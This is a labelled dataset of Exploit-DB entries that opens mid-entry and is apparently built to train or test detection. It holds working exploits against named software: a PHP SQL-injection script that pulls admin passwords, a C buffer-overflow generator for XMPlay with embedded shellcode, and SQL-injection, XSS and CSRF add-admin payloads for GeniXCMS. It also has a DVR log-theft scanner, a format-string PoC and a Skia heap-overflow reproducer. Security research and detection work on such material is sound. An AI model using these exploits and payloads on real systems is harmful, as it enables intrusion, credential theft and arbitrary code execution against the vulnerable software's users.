create a session cookie named 'authorized' with the value 1, and you are logged in.  */ /*********************** CONFIGURATION ****************************/  $PATH_TO_FILE  = 'http://yourhost.com/fuju/archiv2.php';           // in example: http://yourhost.com/fuju/archiv2.php $TABLE_PREFIX  = '';                                               // default: empty $GET_VARS      = '?ID=';                                           // do not change $SQL_INJECTION = '-666 union select pw,0,0,benutzer,0,0,pw from '. // do not change                  $TABLE_PREFIX.'admin_sql /*';   /**************************** MAIN ********************************/  $file_array = file($PATH_TO_FILE.$GET_VARS.urlencode($SQL_INJECTION))or die('couldn\'t open host!');  foreach ($file_array as $now)                                	$html_content .= $now;  $html_content = str_castrate($html_content);  preg_match_all(""!Autor:</span></strong></td></tr><trbordercolorlight='#2E2E2E'bordercolordark='#848484'>"".                ""<tdalign=leftvalign=topbgcolor=\""#49535C\""><divalign='center'><spanclass='Stil2'>(.*?)</div>!"", 			   $html_content,$username); /* gets username */ preg_match_all(""!Kategorie:</span></strong></p></div></td></tr><trbordercolorlight='#2E2E2E'bordercolordark="".                ""'#848484'><tdalign=leftvalign=topbgcolor=\""#49535C\""><divalign='center'><fontclass=\""content\"""". 			   ""><spanclass='Stil2'>(.*?)</span>!"",                  $html_content,$password); /* gets password */  if ($username[1][0] && $password[1][0]) { 	echo 'username: <b>'.$username[1][0].'</b><br>'; 	echo 'password: <b>'.$password[1][0].'</b>'; }else { 	echo 'exploit failed! <br>'; } echo '<br><br><br><br><br> ======================================================================<br> exploit: fuju news 1.0 remote sql injection<br> release: 2006-04-16<br> author: snatcher [snatcher at gmx.ch]<br> ======================================================================';  function str_castrate($string) { 	$string = str_replace(""\n"", '', $string); 	$string = str_replace(""\r"", '', $string); 	$string = str_replace("" "", '', $string); 	return $string; } ?>  # milw0rm.com [2006-04-16]",malicious sql code,1
2821,"XMPlay 3.3.0.4 - '.PLS' Local Buffer Overflow /* =================================================================== 	0-day XMPlay 3.3.0.4 .PLS Filename Buffer Overflow Exploit =================================================================== XMPlay 3.3.0.4 and lower experiance a stack-based buffer overflow when loading malformed M3U and PLS files (probably ASX files as well - working on the ASX Exploit as we speak).  This merely executes CALC.exe but you could always add your own custom shellcode (alpha2)  =============== PLS Format [playlist] File1=C:\[BUFFER][JMP][SHELLCODE][NOPSLED][Extension] Title1=title (could also be used for the buffer overflow exploit)  ESP Stores Address of Shellcode   Huge Greets and Thanks to Expanders (expanders[at]gmail[dot]com) Who I presented the PoC and Discovery to for the original M3U exploit He wrote the first PoC Exploit for it.  And Jerome Athias for some neat tools.  Both of these guys are very talented, keep up the good work.  Reported Exploit Date: 11/21/2006  */   #include <stdio.h> #include <stdlib.h> #include <string.h> int main(int argc, char *argv[]) {  	FILE *Exploit; 	char buffer[512]; 	char *outp;  	/* Executes Calc.exe Alpha2 Shellcode Provided by Expanders <expanders[at]gmail[dot]com> */ 	unsigned char scode[] = 	""TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI"" 	""YlHhQTs0s0c0LKcuwLLK1ls52Xs1JONkRofxNkcoUpUQZKCylK4tLKuQxnTqo0LYnLMTkpptUWiQ9ZdM"" 	""5QO2JKZT5k2tUtUTPuKULKQOfDc1zKPfNkflrkNkSowlvaZKLK5LlKgqxkMYqL14wtYSFQkpcTNkQPtp"" 	""LEiPd8VlNkqPVllKPp7lNMLK0htHjKuYnkMPnP7pc05PLKsXUlsovQxvU0PVOy9hlCo0SKRpsXhoxNip"" 	""sPu8LX9nMZvnv79oM7sSU1rLsSdnu5rX3UuPA"";    	char NOPSled[50]; 	char tail[] = "".mid\r\n""; 	int JMP, x;  	printf(""\n======================================================================\n""); 	printf(""XMPlay 3.3.0.4 and prior PLS Filename Buffer Overflow Exploit\n""); 	printf(""Discovered and Coded By: Greg Linares <GLinares.code[at]gmail[dot]com>\n""); 	printf(""Usage: %s <output PLS file> <JMP> [Exploit Display Name] \n"", argv[0]); 	printf(""\n JMP Options\n""); 	printf(""1 = English Windows XP SP 2 User32.dll <JMP ESP 0x77db41bc>\n""); 	printf(""2 = English Windows XP SP 1 User32.dll <JMP ESP 0x77d718fc>\n""); 	printf(""3 = English Windows 2003 SP0 and SP1 User32.dll <JMP ESP 0x77d74adc>\n""); 	printf(""4 = English Windows 2000 SP 4 User32.dll  <JMP ESP 0x77e3c256>\n""); 	printf(""====================================================================\n\n\n"");   	if (argc < 2) { 		printf(""Invalid Number Of Arguments\n""); 		return 1; 	}   	Exploit = fopen(argv[1],""w"");     if ( !Exploit )     {         printf(""\nCouldn't Open File!"");         return 1;     }  	memset(buffer, 0, 505); 	memset(NOPSled, 0, 20);   	fputs(""[playlist]\r\n"", Exploit); 	fputs(""File1="", Exploit); 	fputs(""C:\\"", Exploit);  	for (x=0;x<505;x++) { 		strcat(buffer, ""A""); 	}  	fputs(buffer, Exploit); 	if (atoi(argv[2]) <= 0) { 		JMP = 1; 	} else if (atoi(argv[2]) > 4) { 		JMP = 1; 	} else { 		JMP = atoi(argv[2]); 	} 	switch(JMP) { 		case 1: 			printf(""Using English Windows XP SP2 JMP...\n""); 			fputs(""\xbc\x41\xdb\x77"", Exploit); 			break; 		case 2: 			printf(""Using English Windows XP SP1 JMP...\n""); 			fputs(""\xfc\x18\xd7\x77"", Exploit); 			break; 		case 3: 			printf(""Using English Windows 2003 SP0 & SP1 JMP...\n""); 			fputs(""\xdc\x4a\xd7\x77"", Exploit); 			break; 		case 4: 			printf(""Using English Windows 2000 SP 4 JMP...\n""); 			fputs(""\x56\xc2\xe3\x77"", Exploit); 			break; 	}  	fputs(scode, Exploit);  	for (x=0;x<20;x++) { 		strcat(NOPSled, ""\x90""); 	}  	fputs(NOPSled, Exploit); 	fputs(tail, Exploit); 	if (strlen(argv[4]) > 0) { 		fputs(""Title1="", Exploit); 		fputs(argv[4], Exploit); 		fputs(""\r\n"", Exploit); 	} else { 		fputs(""Title1=XMPlay_0-Day_PLS_Buffer_Overflow_Exploit_By_Greg_Linares\r\n"", Exploit); 	}  	fputs(""Length1=512"", Exploit);  	printf(""Exploit Succeeded...\n Output File: %s\n\n"", argv[1]);   	printf(""Exploit Coded by Greg Linares (GLinares.code[at]gmail[dot]com)\n""); 	printf(""Greetz to: Jerome Athias and Expanders - Thanks For The Ideas, Tools and Alpha2 Shell Code\n"");  	fclose(Exploit); 	return 0; }  // milw0rm.com [2006-11-21]",malformed M3U and PLS files,1
36321,"GeniXCMS 0.0.1 - Multiple Vulnerabilities ﻿ GeniXCMS v0.0.1 Remote Unauthenticated SQL Injection Exploit  Vendor: MetalGenix Product web page: http://www.genixcms.org Affected version: 0.0.1  Summary: GenixCMS is a PHP Based Content Management System and Framework (CMSF). It's a simple and lightweight of CMSF. Very suitable for Intermediate PHP developer to Advanced Developer. Some manual configurations are needed to make this application to work.  Desc: Input passed via the 'page' GET parameter and the 'username' POST parameter is not properly sanitised before being used in SQL queries. This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.  Tested on: nginx/1.4.6 (Ubuntu)            Apache 2.4.10 (Win32)            PHP 5.6.3            MySQL 5.6.21   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             @zeroscience   Advisory ID: ZSL-2015-5232 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5232.php   05.03.2015  ---   Get admin user/pass hash: -------------------------  http://localhost/genixcms/index.php?page=1' union all select 1,2,(select concat(unhex(hex(cast(user.userid as char))),0x3a,unhex(hex(cast(user.pass as char)))) from `genixcms`.user limit 0,1) ,4,5,6,7,8,9,10 and 'j'='j    Read file (C:\windows\win.ini) and MySQL version: -------------------------------------------------  http://localhost/genixcms/index.php?page=1' union all select 1,2,load_file(0x433a5c77696e646f77735c77696e2e696e69),4,@@version,6,7,8,9,10 and 'j'='j    Read file (/etc/passwd) and MySQL version: ------------------------------------------  http://localhost/genixcms/index.php?page=1' union all select 1,2,load_file(0x2f6574632f706173737764),4,@@version,6,7,8,9,10 and 'j'='j    Get admin user/pass hash: -------------------------  POST /genixcms/gxadmin/login.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 335 Accept: */* User-Agent: ZSLScan_1.4 Connection: Close  password=1&username=' and(select 1 from(select count(*),concat((select (select (select concat(unhex(hex(cast(user.userid as char))),0x3a,unhex(hex(cast(user.pass as char)))) from `genixcms`.user limit 0,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and '1'='1&login=  ################################################################################################  GeniXCMS v0.0.1 Persistent Script Insertion Vulnerability  Vendor: MetalGenix Product web page: http://www.genixcms.org Affected version: 0.0.1  Summary: GenixCMS is a PHP Based Content Management System and Framework (CMSF). It's a simple and lightweight of CMSF. Very suitable for Intermediate PHP developer to Advanced Developer. Some manual configurations are needed to make this application to work.  Desc: Input passed to the 'cat' POST parameter is not properly sanitised before being returned to the user. This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of an affected site.  Tested on: nginx/1.4.6 (Ubuntu)            Apache 2.4.10 (Win32)            PHP 5.6.3            MySQL 5.6.21   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             @zeroscience   Advisory ID: ZSL-2015-5233 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5233.php   05.03.2015  ---   Stored: -------  <html>   <body>     <form action=""http://localhost/genixcms/gxadmin/index.php?page=categories"" method=""POST"">       <input type=""hidden"" name=""parent"" value=""2"" />       <input type=""hidden"" name=""cat"" value='""><script>alert(document.cookie)</script>' />       <input type=""hidden"" name=""addcat"" value="""" />       <input type=""submit"" value=""Insert"" />     </form>   </body> </html>    Reflected: ----------  http://localhost/genixcms/index.php?page=1<script>confirm(""ZSL"")</script>'  ################################################################################################  ﻿ GeniXCMS v0.0.1 CSRF Add Admin Exploit  Vendor: MetalGenix Product web page: http://www.genixcms.org Affected version: 0.0.1  Summary: GenixCMS is a PHP Based Content Management System and Framework (CMSF). It's a simple and lightweight of CMSF. Very suitable for Intermediate PHP developer to Advanced Developer. Some manual configurations are needed to make this application to work.  Desc: The application allows users to perform certain actions via HTTP requests without performing any validity checks to verify the requests. This can be exploited to perform certain actions with administrative privileges if a logged-in user visits a malicious web site.  Tested on: nginx/1.4.6 (Ubuntu)            Apache 2.4.10 (Win32)            PHP 5.6.3            MySQL 5.6.21   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             @zeroscience   Advisory ID: ZSL-2015-5234 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5234.php   05.03.2015  ---   <html>   <body>     <form action=""http://localhost/genixcms/gxadmin/index.php?page=users"" method=""POST"">       <input type=""hidden"" name=""userid"" value=""Testingus"" />       <input type=""hidden"" name=""pass1"" value=""123456"" />       <input type=""hidden"" name=""pass2"" value=""123456"" />       <input type=""hidden"" name=""email"" value=""t00t@zeroscience.eu"" />       <input type=""hidden"" name=""group"" value=""0"" />       <input type=""hidden"" name=""adduser"" value="""" />       <input type=""submit"" value=""Forge!"" />     </form>   </body> </html>",injecting arbitrary SQL code,1
32192,"Combat Evolved 1.0.7.0615 - Multiple Denial of Service Vulnerabilities source: https://www.securityfocus.com/bid/30582/info  Halo: Combat Evolved is prone to multiple remote denial-of-service vulnerabilities because the application fails to properly handle specially crafted network packets.  An attacker may exploit these issues to crash the affected application, denying service to legitimate users.  Halo: Combat Evolved 1.0.7.0615 is vulnerable; other versions may also be affected.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/32192-1.zip https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/32192-2.zip",specially crafted network packets,1
30840,SonicWALL Global VPN Client 4.0.782 - Remote Format String source: https://www.securityfocus.com/bid/26689/info  SonicWALL Global VPN Client is prone to a remote format-string vulnerability because it fails to properly sanitize user-supplied input before passing it as the format specifier to a formatted-printing function.  Successfully exploiting this issue allows remote attackers to execute arbitrary machine code in the context of the application. Failed attempts may cause denial-of-service conditions.  Versions prior to SonicWALL Global VPN Client 4.0.0.830 are affected.   The following proof of concept was supplied: <Connection name=> AAAAAAAAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.% x.%x <HostName> BBBBBBBBBB%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.% x.%x.%x.%x.%x.%x.%x,passing it as the format specifier to a formatted-printing function,1
4797,"March Networks DVR 3204 - Logfile Information Disclosure #!/usr/bin/perl # # March Networks DVR 3204 Logfile Information Disclosure Exploit # # Since configuration of the IP address, user console and root is  # carried out over the ""administrator console"", the vulnerability  # lies within Watchdog's HTTP server application. # # Any user can obtain the log files without authentication by accessing # the following PATH http:/dvraddress/scripts/logfiles.tar.gz. The intruder # can then uncompress the tar file and access the config.dat to reveal # username and passwords, names of devices, and IP addresses of other  # security components attached to the corporate networ # # More details:  # http://www.sybsecurity.com/resources/static/ # An_Insecurity_Overview_of_the_March_Networks_DVR-CCTV_3204.pdf # # By Alex Hernandez ahernandez [at] sybsecurity [dot] com # # Usage: perl -x dvr3204_exp.pl www.marchnetworks.com:80 # Usage: perl -x dvr3204_exp.pl 127.0.0.1:80 # # $ perl -x dvr3204_exp.pl 10.50.10.246:80 # Trying... # # THIS HOST IS VULNERABLE!!! :-) # Check the details on w w w [dot] sybsecurity [dot] c o m # # THIS HOST IS NOT VULNERABLE :-( # Check the settings on browser... # #   use Socket;  if ($#ARGV<0) {die "" \nMarch Networks DVR 3204 exploit\n More details: http://www.sybsecurity.com By Alex Hernandez\n  ahernandez [at] sybsecurity [dot] com\n  Usage: perl -x $0 www.marchnetworks.com:80 Usage: perl -x $0 127.0.0.1:80\n\n"";}  ($host,$port)=split(/:/,@ARGV[0]);  print ""Trying...\n\n""; $target = inet_aton($host); $flag=0;  my @results=sendraw(""GET /Level1Authenticate.htm HTTP/1.0\r\n\r\n""); foreach $line (@results){  if ($line =~ /Directory/) {$flag=1;}}  my @results=sendraw(""GET /UserAuthenticate.htm HTTP/1.0\r\n\r\n""); foreach $line (@results){  if ($line =~ /Directory/) {$flag=1;}}  my @results=sendraw(""GET /public/index.htm HTTP/1.0\r\n\r\n""); foreach $line (@results){  if ($line =~ /Directory/) {$flag=1;}}  my @results=sendraw(""GET /public/UpgradeStatus.htm HTTP/1.0\r\n\r\n""); foreach $line (@results){  if ($line =~ /Directory/) {$flag=1;}}  my @results=sendraw(""GET /public/UpgradeHistory.htm HTTP/1.0\r\n\r\n""); foreach $line (@results){  if ($line =~ /Directory/) {$flag=1;}}  my @results=sendraw(""GET /public/UpgradeHistory.txt HTTP/1.0\r\n\r\n""); foreach $line (@results){  if ($line =~ /Directory/) {$flag=1;}}  my @results=sendraw(""GET /public/dvrlog HTTP/1.0\r\n\r\n""); foreach $line (@results){  if ($line =~ /Directory/) {$flag=1;}}  my @results=sendraw(""GET /scripts/logfiles.tar.gz HTTP/1.0\r\n\r\n""); foreach $line (@results){  if ($line =~ /Directory/) {$flag=1;}}  if ($flag==1){print ""THIS HOST IS VULNERABLE!!! :-)\n Check the details on www [dot] sybsecurity [dot] com\n"";} else {print ""THIS HOST IS NOT VULNERABLE :-( \n Check the settings on browser...\n"";}  sub sendraw {         my ($pstr)=@_;         socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||                 die(""Socket problems\n"");         if(connect(S,pack ""SnA4x8"",2,$port,$target)){                 my @in;                 select(S); $|=1; print $pstr;                 while(<S>){ push @in, $_;}                 select(STDOUT); close(S); return @in;         } else { die(""Can't connect check the port or address...\n""); } }  # milw0rm.com [2007-12-27]",uncompress the tar file and access the config.dat to reveal username and passwords,1
24480,"IRIS Citations Management Tool - (Authenticated) Remote Command Execution Here is a bug that I finally found time to write about :-)  https://infosecabsurdity.wordpress.com/2013/02/09/iris-citations-management-tool-post-auth-remote-command-execution/  The attached contains my mini framework, exploit and screenshot.  Cheers!  ~ aeon  # I Read It Somewhere (IRIS) <= v1.3 (post auth) Remote Command Execution # download: http://ireaditsomewhere.googlecode.com  # Notes:  # - Found this in my archive, duno how long this has been 0Day for... but I had no use for it obviously. # - Yes! ..the code is disgusting, but does the job # - Sorry if I ripped your code, it worked for me and I dont reinvent wheels so thank you! # ~ aeon (https://infosecabsurdity.wordpress.com/) # # Exploit requirements: # ~~~~~~~~~~~~~~~~~~~~~ # # - A valid account as at least a user # - The target to have outgoing internet connectivity  Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/24480.tar.gz",the malicious commands,1
45098,"Skia - Heap Overflow in SkScan::FillPath due to Precision Error There is a heap overflow in Skia when drawing paths with antialiasing turned off. This issue can be triggered in both Google Chrom and Mozilla Firefox by rendering a specially crafted SVG image. PoCs for both browsers are attached.   Details:  When Skia fills a path with antialiasing turned off, SkScan::FillPath gets called https://cs.chromium.org/chromium/src/third_party/skia/src/core/SkScan_Path.cpp?rcl=3708f024b1118a73f0e6b3080234311c6647663b&l=609  SkScan::FillPath first checks that the path fits in the current drawing area (Clip). This happens in https://cs.chromium.org/chromium/src/third_party/skia/src/core/SkScan_Path.cpp?rcl=3708f024b1118a73f0e6b3080234311c6647663b&l=645  If the clipping test passes at this point, then no other clipping checks will be performed when drawing this path. However, due to precision errors, it is possible that the drawing algorith is going to end up drawing outside of the current drawing area, which results in a heap overflow.  In this case, the precision errors happens when drawing cubic splines. In SkCubicEdge::setCubicWithoutUpdate, various factors needed to draw the spline are calculated. For example, on this line https://cs.chromium.org/chromium/src/third_party/skia/src/core/SkEdge.cpp?rcl=5eb8fc585e9b3c9ccc82b0921986e1020ddaff23&l=430 when calculating fCDx, some precision will be lost because C and D end up being shifted to the right. Because of that, it is possible that the fCDx value is going to end up smaller than it should be.  The (too small) value of fCDx then gets added to the X coordinate here https://cs.chromium.org/chromium/src/third_party/skia/src/core/SkEdge.cpp?rcl=5eb8fc585e9b3c9ccc82b0921986e1020ddaff23&l=471  it then gets propagated here https://cs.chromium.org/chromium/src/third_party/skia/src/core/SkEdge.cpp?rcl=5eb8fc585e9b3c9ccc82b0921986e1020ddaff23&l=492  and here https://cs.chromium.org/chromium/src/third_party/skia/src/core/SkEdge.cpp?g=0&rcl=5eb8fc585e9b3c9ccc82b0921986e1020ddaff23&l=116  where fX ends up being -2**15 (this corresponds to -0.5 in SkFixed type) and fDX ends up negative. When a spline (now approximated as a line segment) gets drawn in walk_convex_edges or walk_edges, fDX gets added to fX https://cs.chromium.org/chromium/src/third_party/skia/src/core/SkScan_Path.cpp?rcl=3708f024b1118a73f0e6b3080234311c6647663b&l=267 then the resulting value gets rounded https://cs.chromium.org/chromium/src/third_party/skia/src/core/SkScan_Path.cpp?rcl=3708f024b1118a73f0e6b3080234311c6647663b&l=249 and becomes -1, which leads to an out-of-bounds write.  Example Skia program that demonstrates the issue: Note: it should be built with ASan enabled. =================================================  #include ""SkCanvas.h"" #include ""SkPath.h"" #include ""SkBitmap.h"" #include ""SkGradientShader.h""  int main (int argc, char * const argv[]) {    int width = 100;   int height = 100;    SkBitmap bitmap;   bitmap.allocN32Pixels(width, height);   SkCanvas bitmapcanvas(bitmap);   SkCanvas *canvas = &bitmapcanvas;    SkPaint p;    p.setAntiAlias(false);    p.setStyle(SkPaint::kFill_Style);    SkColor colors[2] = {SkColorSetARGB(10,0,0,0), SkColorSetARGB(10,255,255,255)};   SkPoint points[2] = {      SkPoint::Make(0.0f, 0.0f),      SkPoint::Make(256.0f, 256.0f)   };   p.setShader(SkGradientShader::MakeLinear(              points, colors, nullptr, 2,              SkShader::kClamp_TileMode, 0, nullptr));    SkPath path;   path.moveTo(-30/64.0, -31/64.0);   path.cubicTo(-31/64.0, -31/64,-31/64.0, -31/64,-31/64.0, 100);   path.lineTo(100,100);   path.lineTo(100,-31/64.0);    canvas->drawPath(path, p);    return 0;  }  =================================================  Running this results in the following UBSan error: ../../include/core/SkPixmap.h:386:83: runtime error: left shift of negative value -1 SUMMARY: AddressSanitizer: undefined-behavior ../../include/core/SkPixmap.h:386:83 in   If the program is compiled without undefined-behavior checks, then running it generates the following ASan report  ================================================================= ==18863==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6140000021d0 at pc 0x0000018df91a bp 0x7ffcdc7708d0 sp 0x7ffcdc7708c8 WRITE of size 4 at 0x6140000021d0 thread T0     #0 0x18df919 in (anonymous namespace)::DstTraits<unsigned int, ((anonymous namespace)::ApplyPremul)0>::store((anonymous namespace)::SkNx<4, float> const&, unsigned int*, (anonymous namespace)::SkNx<4, float> const&) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/shaders/gradients/Sk4fGradientPriv.h:73:18     #1 0x18df919 in void (anonymous namespace)::ramp<unsigned int, ((anonymous namespace)::ApplyPremul)0>((anonymous namespace)::SkNx<4, float> const&, (anonymous namespace)::SkNx<4, float> const&, unsigned int*, int, (anonymous namespace)::SkNx<4, float> const&, (anonymous namespace)::SkNx<4, float> const&) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/shaders/gradients/Sk4fLinearGradient.cpp:45     #2 0x18d3eb1 in void SkLinearGradient::LinearGradient4fContext::shadeSpanInternal<unsigned int, ((anonymous namespace)::ApplyPremul)0, (SkShader::TileMode)0>(int, int, unsigned int*, int, float, float) const /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/shaders/gradients/Sk4fLinearGradient.cpp:256:13     #3 0x18d3eb1 in void SkLinearGradient::LinearGradient4fContext::shadePremulSpan<unsigned int, ((anonymous namespace)::ApplyPremul)0>(int, int, unsigned int*, int, float, float) const /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/shaders/gradients/Sk4fLinearGradient.cpp:209     #4 0x18d3eb1 in SkLinearGradient::LinearGradient4fContext::shadeSpan(int, int, unsigned int*, int) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/shaders/gradients/Sk4fLinearGradient.cpp:181     #5 0x167213d in SkARGB32_Shader_Blitter::blitH(int, int, int) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkBlitter_ARGB32.cpp:377:25     #6 0xd1cf47 in walk_convex_edges(SkEdge*, SkPath::FillType, SkBlitter*, int, int, void (*)(SkBlitter*, int, bool)) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkScan_Path.cpp:261:30     #7 0xd1b364 in sk_fill_path(SkPath const&, SkIRect const&, SkBlitter*, int, int, int, bool) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkScan_Path.cpp:471:9     #8 0xd1e625 in SkScan::FillPath(SkPath const&, SkRegion const&, SkBlitter*) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkScan_Path.cpp:656:9     #9 0xd0c39a in SkScan::FillPath(SkPath const&, SkRasterClip const&, SkBlitter*) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkScan_AntiPath.cpp:827:9     #10 0xb9ae3d in SkDraw::drawDevPath(SkPath const&, SkPaint const&, bool, SkBlitter*, bool, SkInitOnceData*) const /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkDraw.cpp:1024:9     #11 0xb9c046 in SkDraw::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool, bool, SkBlitter*, SkInitOnceData*) const /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkDraw.cpp:1141:11     #12 0x164e60a in SkDraw::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool) const /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkDraw.h:58:15     #13 0x164e60a in SkBitmapDevice::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkBitmapDevice.cpp:411     #14 0xb44c54 in SkCanvas::onDrawPath(SkPath const&, SkPaint const&) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkCanvas.cpp:2145:23     #15 0xb3bf59 in SkCanvas::drawPath(SkPath const&, SkPaint const&) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkCanvas.cpp:1708:11     #16 0x86021e in main /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../example/SkiaSDLExample.cpp:37:11     #17 0x7fd0eb3672b0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202b0)     #18 0x770659 in _start (/usr/local/google/home/ifratric/p0/skia/skia/out/asan/SkiaSDLExample+0x770659)  0x6140000021d0 is located 0 bytes to the right of 400-byte region [0x614000002040,0x6140000021d0) allocated by thread T0 here:     #0 0x825b20 in __interceptor_malloc (/usr/local/google/home/ifratric/p0/skia/skia/out/asan/SkiaSDLExample+0x825b20)     #1 0xdf1d74 in sk_malloc_flags(unsigned long, unsigned int) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/ports/SkMemory_malloc.cpp:69:13     #2 0x1671202 in sk_malloc_throw(unsigned long) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../include/private/SkMalloc.h:59:12     #3 0x1671202 in SkARGB32_Shader_Blitter::SkARGB32_Shader_Blitter(SkPixmap const&, SkPaint const&, SkShaderBase::Context*) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkBlitter_ARGB32.cpp:336     #4 0x16643f9 in SkARGB32_Shader_Blitter* SkArenaAlloc::make<SkARGB32_Shader_Blitter, SkPixmap const&, SkPaint const&, SkShaderBase::Context*&>(SkPixmap const&, SkPaint const&, SkShaderBase::Context*&) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkArenaAlloc.h:103:30     #5 0x1663681 in SkBlitter::Choose(SkPixmap const&, SkMatrix const&, SkPaint const&, SkArenaAlloc*, bool) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkBlitter.cpp:1119:34     #6 0xb9b4fe in SkAutoBlitterChoose::choose(SkDraw const&, SkMatrix const*, SkPaint const&, bool) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkAutoBlitterChoose.h:36:20     #7 0xb9aa59 in SkDraw::drawDevPath(SkPath const&, SkPaint const&, bool, SkBlitter*, bool, SkInitOnceData*) const /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkDraw.cpp:966:34     #8 0xb9c046 in SkDraw::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool, bool, SkBlitter*, SkInitOnceData*) const /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkDraw.cpp:1141:11     #9 0x164e60a in SkDraw::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool) const /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkDraw.h:58:15     #10 0x164e60a in SkBitmapDevice::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkBitmapDevice.cpp:411     #11 0xb44c54 in SkCanvas::onDrawPath(SkPath const&, SkPaint const&) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkCanvas.cpp:2145:23     #12 0xb3bf59 in SkCanvas::drawPath(SkPath const&, SkPaint const&) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkCanvas.cpp:1708:11     #13 0x86021e in main /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../example/SkiaSDLExample.cpp:37:11     #14 0x7fd0eb3672b0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202b0)  SUMMARY: AddressSanitizer: heap-buffer-overflow /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/shaders/gradients/Sk4fGradientPriv.h:73:18 in (anonymous namespace)::DstTraits<unsigned int, ((anonymous namespace)::ApplyPremul)0>::store((anonymous namespace)::SkNx<4, float> const&, unsigned int*, (anonymous namespace)::SkNx<4, float> const&) Shadow bytes around the buggy address:   0x0c287fff83e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c287fff83f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c287fff8400: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00   0x0c287fff8410: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0c287fff8420: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0c287fff8430: 00 00 00 00 00 00 00 00 00 00[fa]fa fa fa fa fa   0x0c287fff8440: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00   0x0c287fff8450: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0c287fff8460: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0c287fff8470: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0c287fff8480: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes):   Addressable:           00   Partially addressable: 01 02 03 04 05 06 07    Heap left redzone:       fa   Freed heap region:       fd   Stack left redzone:      f1   Stack mid redzone:       f2   Stack right redzone:     f3   Stack after return:      f5   Stack use after scope:   f8   Global redzone:          f9   Global init order:       f6   Poisoned by user:        f7   Container overflow:      fc   Array cookie:            ac   Intra object redzone:    bb   ASan internal:           fe   Left alloca redzone:     ca   Right alloca redzone:    cb ==18863==ABORTING   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45098.zip",rendering a specially crafted SVG image,1
